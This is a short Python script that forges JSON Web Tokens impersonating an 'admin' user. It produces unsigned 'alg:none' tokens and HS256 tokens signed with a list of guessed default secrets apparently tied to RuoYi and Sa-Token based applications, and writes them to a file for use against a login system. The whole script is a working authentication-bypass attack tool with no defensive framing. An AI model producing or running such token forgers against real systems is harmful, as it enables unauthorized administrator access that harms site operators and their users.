import base64,hmac,hashlib,json,time,uuid

def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

exp=int(time.time())+86400
payloads={
 "p1":{"sub":"1","loginId":1,"username":"admin","userId":1,"exp":exp,"iat":int(time.time())},
 "p2":{"loginId":"1","username":"admin"},
}
keys=["ruoyi","RuoYi","jydsj","jydsj-vue-plus","jydsj@2024","123456","sa-token","sa-token-secret","dptech","abcdefghijklmnopqrstuvwxyz"]

def hs256(pl,k,alg="HS256"):
    h={"alg":alg,"typ":"JWT"}
    s=b64(json.dumps(h,separators=(',',':')).encode())+"."+b64(json.dumps(pl,separators=(',',':')).encode())
    sig=hmac.new(k.encode(),s.encode(),hashlib.sha256).digest()
    return s+"."+b64(sig)

out=[]
for pn,pl in payloads.items():
    h=b64(json.dumps({"alg":"none","typ":"JWT"},separators=(',',':')).encode())
    none_tok=h+"."+b64(json.dumps(pl,separators=(',',':')).encode())+"."
    out.append((f"none-{pn}",none_tok))
for k in keys:
    for pn in ["p1","p2"]:
        out.append((f"hs256[{k}]-{pn}",hs256(payloads[pn],k)))
out.append(("uuid",str(uuid.uuid4())))
with open("tokens.tsv","w") as f:
    for n,t in out:
        f.write(f"{n}\t{t}\n")
print(len(out),"tokens")
